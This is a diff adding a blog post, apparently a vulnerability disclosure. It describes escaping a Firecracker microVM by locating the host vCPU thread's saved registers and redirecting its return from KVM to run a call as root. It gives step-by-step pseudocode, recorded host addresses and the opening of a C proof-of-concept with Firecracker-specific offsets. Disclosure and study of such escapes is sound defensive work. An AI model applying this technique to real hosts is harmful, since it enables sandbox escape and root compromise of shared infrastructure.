@@ -1,0 +1,460 @@
+<div><div><div class="prose prose-sm sm:prose-base lg:prose-lg max-w-none prose-headings:font-bold prose-headings:font-heading prose-headings:text-[var(--m-heading)] prose-h1:text-xl prose-h1:sm:text-2xl prose-h1:lg:text-3xl prose-h1:mb-4 prose-h1:sm:mb-6 prose-h1:mt-6 prose-h1:sm:mt-10 prose-h2:text-lg prose-h2:sm:text-xl prose-h2:lg:text-2xl prose-h2:mb-3 prose-h2:sm:mb-4 prose-h2:mt-6 prose-h2:sm:mt-10 prose-h2:border-b prose-h2:border-[var(--m-border-lt)] prose-h2:pb-3 prose-h3:text-base prose-h3:sm:text-lg prose-h3:lg:text-xl prose-h3:mb-2 prose-h3:sm:mb-3 prose-h3:mt-4 prose-h3:sm:mt-8 prose-h4:text-sm prose-h4:sm:text-base prose-h4:lg:text-lg prose-h4:mb-2 prose-h4:mt-3 prose-h4:sm:mt-6 prose-p:text-[var(--m-text-2)] prose-p:leading-relaxed prose-p:mb-4 prose-p:sm:mb-5 prose-p:text-sm prose-p:sm:text-base prose-p:lg:text-lg prose-a:text-[var(--m-red)] prose-a:no-underline hover:prose-a:underline prose-a:font-medium prose-strong:text-[var(--m-heading)] prose-strong:font-semibold prose-code:text-[var(--m-red)] prose-code:bg-[var(--m-surface)] prose-code:px-1.5 prose-code:py-0.5 prose-code:rounded prose-code:text-xs prose-code:sm:text-sm prose-code:border prose-code:border-[var(--m-border-lt)] prose-code:before:content-none prose-code:after:content-none prose-pre:bg-transparent prose-pre:border-0 prose-pre:p-0 prose-pre:m-0 prose-blockquote:border-l-4 prose-blockquote:border-l-[var(--m-red)] prose-blockquote:text-[var(--m-text-2)] prose-blockquote:italic prose-blockquote:pl-4 prose-blockquote:sm:pl-6 prose-blockquote:my-6 prose-blockquote:bg-[var(--m-surface)] prose-blockquote:py-4 prose-blockquote:pr-4 prose-blockquote:sm:pr-6 prose-blockquote:rounded-r-lg prose-blockquote:text-sm prose-blockquote:sm:text-base prose-ul:text-[var(--m-text-2)] prose-ul:my-4 prose-ul:sm:my-6 prose-ul:space-y-2 prose-ul:text-sm prose-ul:sm:text-base prose-ul:lg:text-lg prose-ol:text-[var(--m-text-2)] prose-ol:my-4 prose-ol:sm:my-6 prose-ol:space-y-2 prose-ol:text-sm prose-ol:sm:text-base prose-ol:lg:text-lg prose-li:marker:text-[var(--m-red)] prose-li:leading-relaxed prose-table:border-collapse prose-table:w-full prose-table:my-4 prose-table:text-sm prose-thead:bg-[var(--m-surface)] prose-thead:border-b prose-thead:border-[var(--m-border-lt)] prose-th:text-left prose-th:px-3 prose-th:py-2 prose-th:text-[var(--m-heading)] prose-th:font-semibold prose-th:text-sm prose-td:px-3 prose-td:py-2 prose-td:border-b prose-td:border-[var(--m-border-lt)] prose-td:text-sm prose-hr:border-[var(--m-border-lt)] prose-hr:my-8 prose-img:rounded-lg prose-img:shadow-xl prose-img:my-6 prose-figure:my-6 prose-figcaption:text-center prose-figcaption:text-xs prose-figcaption:text-[var(--m-text-3)] prose-figcaption:mt-2"><p>Firecracker is supposed to keep untrusted code inside a microVM. We escaped it and achieved code execution as root on the host.</p>
+<p>We found how it saved registers, changed where it would resume, and made it execute a call of our choosing when it returned from KVM. The guest then restored the temporary stack changes. Firecracker kept running, and the VM remained accessible over SSH.</p>
+<p><a href="https://pwn.ai/blog/pwnescape" target="_blank" rel="noopener">PwnEscape Part 1</a> introduced the host memory primitive behind this work. Here we follow the next part of the chain: using that access to find Firecracker in memory and take over a live thread from inside the guest. This is a continuation to show CVE-2026-99999 on a Firecracker setup.</p>
+<h2>00 / Choosing where to take control</h2>
+<p>A Firecracker microVM has a process on the host that manages it. Each virtual CPU, or vCPU, has a thread in that process. The thread enters KVM to run the guest and returns to Firecracker when an event needs handling in userspace. Firecracker documents this arrangement in its <a href="https://github.com/firecracker-microvm/firecracker/blob/main/docs/design.md#internal-architecture" target="_blank" rel="noopener">architecture overview</a>.</p>
+<figure class="my-6"><img src="https://pwn.ai/api/blog/images/firecracker-host-integration-dbdde36ef234.png" alt="firecracker-host-integration-dbdde36ef234" loading="lazy"><figcaption class="mt-3 text-center text-sm text-slate-400">firecracker-host-integration-dbdde36ef234</figcaption></figure>
+<p>The call that runs the virtual CPU looks like this:</p>
+<div class="relative my-4 sm:my-6"><div class="bg-slate-900 border border-slate-800/60 rounded-lg overflow-hidden "><div class="overflow-x-auto"><pre class="m-0 bg-transparent"><code class="hljs language-c block text-[10px] sm:text-sm leading-relaxed font-mono p-3 sm:p-4">ioctl(vcpu_fd, KVM_RUN, <span class="hljs-number">0</span>);
+</code></pre></div></div></div>
+<p>While the thread is in that system call, the host kernel holds its saved userspace registers in a structure called <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">pt_regs</code>. These registers describe the Firecracker thread: its instruction pointer says where execution should resume, and its stack pointer says which userspace stack it should use.</p>
+<p>That made the return from <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">KVM_RUN</code> an attractive target. If we could locate and modify the saved frame, we could choose the code Firecracker executed when the thread returned to userspace. A guest operation that caused such a return would provide the trigger.</p>
+<p>We already had access to selected host physical memory through a guest mapping. To use it, we needed to identify the Firecracker process, find code we could call in that process, and locate the register frame belonging to its active vCPU thread. The starting point was a page of memory we controlled inside the guest.</p>
+<figure class="my-6"><img src="https://pwn.ai/api/blog/images/01-guest-to-vmm-chain-5c0fbee0cb07.png" alt="01-guest-to-vmm-chain-5c0fbee0cb07" loading="lazy"><figcaption class="mt-3 text-center text-sm text-slate-400">01-guest-to-vmm-chain-5c0fbee0cb07</figcaption></figure>
+<p><em>Figure 1. The guest identifies its Firecracker process, finds the saved registers for a vCPU thread, and redirects the thread when it returns from KVM.</em></p>
+<h2>01 / Finding our guest page on the host</h2>
+<p>The guest and host use different physical address spaces. A page has a guest physical address, or GPA, inside the VM and a host physical address, or HPA, in the machine backing it. On the target, Extended Page Tables (EPT) provide the translation between them.</p>
+<p>We placed a recognizable byte pattern, a nonce, in a guest page. The first resolver took that page's known GPA and its contents as inputs. Together, they gave us an address to translate and a way to check whether the translation reached our page.</p>
+<p>The resolver searched the host physical ranges covered by the memory primitive for candidate EPT roots. An EPT root is the starting point of the translation tables. For each candidate, the resolver followed the entries selected by the guest address until it reached a physical page, then checked that page for the nonce.</p>
+<p>The snippets below are explanatory pseudocode with descriptive helper names. They show the data passed between stages and the checks used to connect them.</p>
+<div class="relative my-4 sm:my-6"><div class="bg-slate-900 border border-slate-800/60 rounded-lg overflow-hidden "><div class="overflow-x-auto"><pre class="m-0 bg-transparent"><code class="hljs language-text block text-[10px] sm:text-sm leading-relaxed font-mono p-3 sm:p-4">for root in candidate_ept_roots:
+    page_hpa = walk_ept(root, guest_gpa)
+    if page_hpa is invalid:
+        continue
+
+    contents = read_host(page_hpa, length(nonce))
+    if contents == nonce:
+        candidates.append((root, page_hpa))
+</code></pre></div></div></div>
+<p>The nonce check connected a proposed translation to memory we controlled. The broader search produced two candidates; validation of the nested page tables reduced them to one EPT root. Walking that root gave us the host physical address of our guest page.</p>
+<p>We called this result <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">guest_page_hpa</code> and passed it to the next resolver. We now had a recognizable object in host memory. The next task was finding the host process that mapped it.</p>
+<h2>02 / Finding the Firecracker process</h2>
+<p>Firecracker maps memory used by the guest into its own address space. That mapping gave us a way to work backward from the guest page to the process.</p>
+<p>Host processes use page tables to translate their virtual addresses into physical memory. The top level is called the page global directory, or PGD. Recovering the appropriate PGD would let us translate addresses inside Firecracker and read its code and stack through the memory primitive.</p>
+<p>Our reverse mapper searched the native host page tables for a mapping of <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">guest_page_hpa</code>. A normal page table walk starts with a virtual address and produces a physical address. Here, we looked for a mapping to a physical page we already knew, then recovered the virtual address and page table root associated with it.</p>
+<p>The check runs in both directions:</p>
+<div class="relative my-4 sm:my-6"><div class="bg-slate-900 border border-slate-800/60 rounded-lg overflow-hidden "><div class="overflow-x-auto"><pre class="m-0 bg-transparent"><code class="hljs language-text block text-[10px] sm:text-sm leading-relaxed font-mono p-3 sm:p-4">for mapping in reverse_map_host_page_tables(guest_page_hpa):
+    pgd = mapping.root
+    guest_page_va = mapping.virtual_address
+
+    resolved_hpa = walk_host_page_tables(pgd, guest_page_va)
+    if resolved_hpa != guest_page_hpa:
+        continue
+
+    if read_host(resolved_hpa, length(nonce)) != nonce:
+        continue
+
+    process_candidates.append((pgd, guest_page_va))
+</code></pre></div></div></div>
+<p>This connected the host process's virtual mapping to the physical page found through EPT. The reverse mapper returned one validated address space. We retained its root as <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">host_pgd</code> and used it to inspect the process.</p>
+<p>The next resolver looked for the Firecracker executable in those mappings. It identified an ELF image and checked a known byte sequence in Firecracker's <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">write(2)</code> wrapper. That connected the recovered address space to the binary we were targeting.</p>
+<p>ASLR changes where an executable is loaded. The difference between an address in the ELF image and its corresponding runtime address is the load bias. Once the mapper had identified the image, it could recover that bias and use it to locate the code required by the exploit:</p>
+<div class="relative my-4 sm:my-6"><div class="bg-slate-900 border border-slate-800/60 rounded-lg overflow-hidden "><div class="overflow-x-auto"><pre class="m-0 bg-transparent"><code class="hljs language-text block text-[10px] sm:text-sm leading-relaxed font-mono p-3 sm:p-4">runtime_code_address = load_bias + code_address_in_elf
+</code></pre></div></div></div>
+<p>The mapper returned the load bias as <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">firecracker_base</code>. With that value and <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">host_pgd</code>, we could locate code in the running process, translate its virtual address to host physical memory, and compare the bytes there with the expected binary.</p>
+<p>We checked three locations: the <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">write(2)</code> wrapper that would produce our proof, the continuation after the KVM ioctl, and a short <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">xor eax,eax; ret</code> sequence needed to return cleanly. Their purposes become relevant when we construct the return path below.</p>
+<p>At this point, the guest could inspect the Firecracker image and its private mappings. We still needed the saved registers of the thread currently running our VM.</p>
+<figure class="my-6"><img src="https://pwn.ai/api/blog/images/02-address-resolution-0e47fd8bf102.png" alt="02-address-resolution-0e47fd8bf102" loading="lazy"><figcaption class="mt-3 text-center text-sm text-slate-400">02-address-resolution-0e47fd8bf102</figcaption></figure>
+<p><em>Figure 2. The nonce identifies the guest page in host memory. Its mapping leads to a host page table root, which lets the next resolver locate and validate the Firecracker image.</em></p>
+<h2>03 / Locating the live vCPU frame</h2>
+<p>The frame finder took <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">host_pgd</code> and <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">firecracker_base</code> from the preceding stages. It used them to recognize the host thread's saved state.</p>
+<p>The most useful clue was the return address. A vCPU thread in <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">KVM_RUN</code> should have a saved instruction pointer at the corresponding ioctl continuation in Firecracker. We could calculate that address from the validated binary and its load bias.</p>
+<p>We then searched host memory for a <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">pt_regs</code> frame consistent with that call. An address match alone would also pick up stale stack contents, so the candidate had to satisfy several related checks:</p>
+<table><thead><tr><th>Saved state</th><th>What we checked</th></tr></thead><tbody><tr><td>System call</td><td>The syscall identity and in-progress state matched an active ioctl.</td></tr><tr><td>Request argument</td><td>The ioctl request was <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">KVM_RUN</code>.</td></tr><tr><td>File descriptor</td><td>The descriptor fell within the helper's expected range.</td></tr><tr><td>Instruction pointer</td><td>It matched the validated Firecracker ioctl continuation.</td></tr><tr><td>Stack pointer</td><td>It translated through the recovered host PGD.</td></tr><tr><td>Segment selectors and flags</td><td>They described a valid return to userspace.</td></tr><tr><td>Caller return address</td><td>It fell inside the validated Firecracker text mapping.</td></tr></tbody></table>
+<p>The stack check tied the frame to the same address space we had recovered from the guest page. The instruction and caller addresses tied it to the Firecracker image. The syscall fields tied it to the operation running the vCPU.</p>
+<p>The search left one candidate. Its location was stored as <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">frame_hpa</code>, the host physical address of the saved register frame. We passed it, the PGD, and the load bias to the final helper.</p>
+<p>Before changing memory, the helper repeated the code signature, frame, and stack checks. This ensured that the active stage used the same process state the resolvers had identified. The subsequent execution and recovery checks would establish that the selected frame was live.</p>
+<figure class="my-6"><img src="https://pwn.ai/api/blog/images/03-live-kvm-run-frame-ddb3ad26cf50.png" alt="03-live-kvm-run-frame-ddb3ad26cf50" loading="lazy"><figcaption class="mt-3 text-center text-sm text-slate-400">03-live-kvm-run-frame-ddb3ad26cf50</figcaption></figure>
+<p><em>Figure 3. The candidate register frame must agree with the KVM ioctl, the recovered process page tables, and the validated Firecracker code.</em></p>
+<h2>04 / Redirecting the return from KVM</h2>
+<p>We chose a simple payload: make the Firecracker process write a recognizable string to its own stderr. This would give the host runner an observable result from the process we had taken over.</p>
+<p>The string was <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">N8V23M2\n</code>, seven characters followed by a newline. It occupies eight bytes and fits in one stack word. The call we wanted Firecracker to execute was:</p>
+<div class="relative my-4 sm:my-6"><div class="bg-slate-900 border border-slate-800/60 rounded-lg overflow-hidden "><div class="overflow-x-auto"><pre class="m-0 bg-transparent"><code class="hljs language-c block text-[10px] sm:text-sm leading-relaxed font-mono p-3 sm:p-4">write(<span class="hljs-number">2</span>, <span class="hljs-string">"N8V23M2\n"</span>, <span class="hljs-number">8</span>);
+</code></pre></div></div></div>
+<p>Here <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">2</code> is Firecracker's stderr file descriptor. The buffer pointer must refer to the string in Firecracker's address space, so we stored the string on its private userspace stack.</p>
+<p>We saved three stack words before modifying them. One held the string; the other two held the return addresses for the temporary call sequence. We then changed the saved register frame to supply the wrapper address, its arguments, and a stack pointer for that sequence:</p>
+<div class="relative my-4 sm:my-6"><div class="bg-slate-900 border border-slate-800/60 rounded-lg overflow-hidden "><div class="overflow-x-auto"><pre class="m-0 bg-transparent"><code class="hljs language-text block text-[10px] sm:text-sm leading-relaxed font-mono p-3 sm:p-4">RIP  = address of Firecracker's write wrapper
+RDI  = 2
+RSI  = virtual address of the marker on Firecracker's stack
+RDX  = 8
+RSP  = virtual address of the temporary return sequence
+</code></pre></div></div></div>
+<p>Returning from <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">write</code> also needed care. A successful write of eight bytes returns <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">8</code>, while a successful <a href="https://docs.kernel.org/virt/kvm/api.html#kvm-run" target="_blank" rel="noopener"><code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">KVM_RUN</code> call returns zero</a>. We placed the address of <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">xor eax,eax; ret</code> first in the return sequence. It clears the return value before the second address brings execution back to Firecracker's original ioctl continuation.</p>
+<p>The resulting control flow was:</p>
+<div class="relative my-4 sm:my-6"><div class="bg-slate-900 border border-slate-800/60 rounded-lg overflow-hidden "><div class="overflow-x-auto"><pre class="m-0 bg-transparent"><code class="hljs language-text block text-[10px] sm:text-sm leading-relaxed font-mono p-3 sm:p-4">KVM_RUN returns to userspace
+    -&gt; Firecracker's write wrapper emits the marker
+    -&gt; xor eax,eax; ret sets the return value to zero
+    -&gt; execution resumes at the original ioctl continuation
+</code></pre></div></div></div>
+<p>With the stack and saved registers prepared, the guest wrote one byte to its serial port. That operation caused the vCPU thread to return from <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">KVM_RUN</code>. The kernel restored the modified registers, and Firecracker entered the <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">write</code> wrapper with our arguments.</p>
+<p>The wrapper emitted the marker, the return sequence cleared <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">eax</code>, and the thread rejoined its original execution path. After control returned to the guest, the helper restored all three stack words.</p>
+<figure class="my-6"><img src="https://pwn.ai/api/blog/images/04-reversible-control-flow-10ae6af41746.png" alt="04-reversible-control-flow-10ae6af41746" loading="lazy"><figcaption class="mt-3 text-center text-sm text-slate-400">04-reversible-control-flow-10ae6af41746</figcaption></figure>
+<p><em>Figure 4. The saved register frame enters the write wrapper. Two return addresses lead through the return-value adjustment and back into the original Firecracker path.</em></p>
+<h2>05 / Checking execution and recovery</h2>
+<p>The host runner captured Firecracker's stderr separately from the guest. The complete output was:</p>
+
+<p>The capture contained exactly eight bytes, including the final newline. Firecracker was still running, guest SSH was responsive, and the helper had restored the three temporary stack words.</p>
+<p>We checked recovery with a fresh pass that made no memory changes. It was given the same frame address and repeated the register, code, and stack checks after the trigger. The checks passed, and it found no stale marker in the temporary stack location.</p>
+<p>These observations answered three different questions. The guest log recorded the trigger and restoration. The host capture showed that Firecracker executed the selected operation. The final validation checked the state after execution.</p>
+<table><thead><tr><th>Check</th><th>Recorded result</th></tr></thead><tbody><tr><td>Firecracker stderr</td><td>One copy of the marker, eight bytes in total</td></tr><tr><td>Firecracker process</td><td>PID <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">2936</code>, alive after the trigger</td></tr><tr><td>Guest health</td><td>SSH responsive; uptime <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">1615.72</code> seconds</td></tr><tr><td>Temporary stack state</td><td>All three original words restored</td></tr><tr><td>Executable text and shared libraries</td><td>Unmodified</td></tr><tr><td>Host kernel errors after the trigger</td><td>None observed</td></tr><tr><td>Validation after restoration</td><td>The supplied frame address and surrounding invariants passed</td></tr></tbody></table>
+<figure class="my-6"><img src="https://pwn.ai/api/blog/images/05-proof-receipt-6e8ad89bf50c.png" alt="05-proof-receipt-6e8ad89bf50c" loading="lazy"><figcaption class="mt-3 text-center text-sm text-slate-400">05-proof-receipt-6e8ad89bf50c</figcaption></figure>
+<p><em>Figure 5. The guest log, Firecracker stderr capture, and final validation record the trigger, host execution, and restored state.</em></p>
+<h2>06 / Root execution on the host</h2>
+<p>By the time the marker appeared, the guest had selected the host thread's instruction pointer, function arguments, stack data, and return path. Firecracker executed the call using its own privileges.</p>
+<p>The target was Firecracker v1.16.1 on x86-64, with host kernel <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">7.0.0-1011-aws</code> and guest kernel <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">6.18.44+</code>. We launched Firecracker directly as root under <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">systemd-run</code> and pinned it with <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">taskset</code>. Consequently, the controlled call executed as root on the host.</p>
+<p>The existing write wrapper gave us a compact proof of that control. Extending it to other calls would require choosing code and arguments compatible with the process's mappings and syscall policy.</p>
+<p>The configuration used here had no jailer. Firecracker's <a href="https://github.com/firecracker-microvm/firecracker/blob/main/docs/design.md#sandboxing" target="_blank" rel="noopener">production containment</a> includes dropping privileges and restricting the process through namespaces and seccomp. A deployment using those controls requires a separate assessment of the privileges and resources available after compromising its VMM.</p>
+<p>The address discovery is what lets the exploit follow the running instance. The EPT resolver connects a guest page to host memory; the reverse mapper recovers the host address space; the image mapper locates Firecracker under ASLR; and the frame finder identifies the vCPU's saved state. Adapting the final stage to another build requires validating that binary's code signatures and return path.</p>
+<p>The guest had used access to host memory to take over the thread running the VM itself. A serial write supplied the trigger, and the next userspace operation belonged to us.</p>
+<h2>Captured resolver values and artifacts</h2>
+<p>The following values come from the preserved execution record. The methods above use symbolic names so that the role of each value is clear; this table connects those names to the recorded addresses.</p>
+<table><thead><tr><th>Value</th><th>Recorded address</th><th>Where it enters the chain</th></tr></thead><tbody><tr><td><code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">guest_gpa</code></td><td><code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">0x08f03000</code></td><td>The guest physical address of the nonce page, supplied to the first resolver</td></tr><tr><td><code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">guest_page_hpa</code></td><td><code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">0x165610000</code></td><td>The host address of that page, found by the EPT resolver</td></tr><tr><td><code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">host_pgd</code></td><td><code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">0x14afc2000</code></td><td>The host page table root recovered by the reverse mapper</td></tr><tr><td><code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">firecracker_base</code></td><td><code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">0x7298c2400000</code></td><td>The Firecracker load bias recovered by the image mapper</td></tr><tr><td><code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">frame_hpa</code></td><td><code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">0x13a5bff48</code></td><td>The saved register frame selected for the active stage</td></tr></tbody></table>
+<p>The records use run ID <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">eventpath-v23-0907self02</code> and boot ID <code class="text-cyan-300 bg-slate-800/70 px-1.5 py-0.5 rounded text-xs sm:text-sm border border-slate-700/50 break-words">2b3cd5ac-2311-427f-a50a-6a79ecb8daa7</code>. These identifiers connect the resolver records, host capture, and validation after restoration.</p>
+<p>The earlier memory provider also received host-selected task and canary page frame numbers as independent validation overlays after constructing the memory aperture. Those addresses were not consumed by the EPT resolver, reverse mapper, Firecracker mapper, frame finder, or final marker helper.</p>
+<p>The release bundle contains the final helper source, JSONL resolver records, host capture, recovery manifest, four preserved read-only resolver binaries with provenance, and SHA-256 manifests. The final helper accepts the PGD, load bias, and frame HPA produced by the resolvers. Its checks cover the run identifier, address ranges, code signatures, saved registers, and stack geometry; its dry-run mode performs validation without writing memory.</p>
+<h2>Proof of Concept</h2>
+<div class="relative my-4 sm:my-6"><div class="bg-slate-900 border border-slate-800/60 rounded-lg overflow-hidden "><div class="overflow-x-auto"><pre class="m-0 bg-transparent"><code class="hljs language-C block text-[10px] sm:text-sm leading-relaxed font-mono p-3 sm:p-4"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span>
+
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
+
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE_U64 UINT64_C(4096)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> HUGE_2M_U64 (UINT64_C(1) &lt;&lt; 21)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> HUGE_1G_U64 (UINT64_C(1) &lt;&lt; 30)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> L4_ALIAS_BASE (UINT64_C(1) &lt;&lt; 39)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> FIRST_HPA_GIB UINT64_C(4)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> LAST_HPA_GIB UINT64_C(192)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> MARKER_CONFLICT_HPA_GIB UINT64_C(16)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> MARKER_REMAP_ENTRY UINT64_C(193)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> ADDRESS_MASK_4K UINT64_C(0x000ffffffffff000)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> ADDRESS_MASK_2M UINT64_C(0x000fffffffe00000)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> ADDRESS_MASK_1G UINT64_C(0x000fffffc0000000)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_PRESENT UINT64_C(0x1)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_USER UINT64_C(0x4)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_LARGE UINT64_C(0x80)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_PROTNONE UINT64_C(0x100)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> IOCTL_RETURN_VADDR UINT64_C(0x26aad2)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> WRITE_VADDR UINT64_C(0x27071e)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> ZERO_EAX_RET_VADDR UINT64_C(0x1b274)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> TEXT_FIRST_VADDR UINT64_C(0x12000)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> TEXT_LAST_VADDR UINT64_C(0x276000)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> KVM_RUN_REQUEST UINT64_C(0xae80)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> SYS_IOCTL UINT64_C(16)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_AX_IN_PROGRESS UINT64_C(0xffffffffffffffda)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> USER_CS UINT64_C(0x33)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> USER_SS UINT64_C(0x2b)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> PTREG_WORDS UINT64_C(21)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> MARKER_LENGTH UINT64_C(8)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> MARKER_STACK_OFFSET UINT64_C(0x30)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> ROP_STACK_OFFSET UINT64_C(16)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> SERIAL_PORT UINT64_C(0x3f8)</span>
+
+<span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> marker_bytes[MARKER_LENGTH] = {
+    <span class="hljs-string">'N'</span>, <span class="hljs-string">'8'</span>, <span class="hljs-string">'V'</span>, <span class="hljs-string">'2'</span>, <span class="hljs-string">'3'</span>, <span class="hljs-string">'M'</span>, <span class="hljs-string">'2'</span>, <span class="hljs-string">'\n'</span>
+};
+
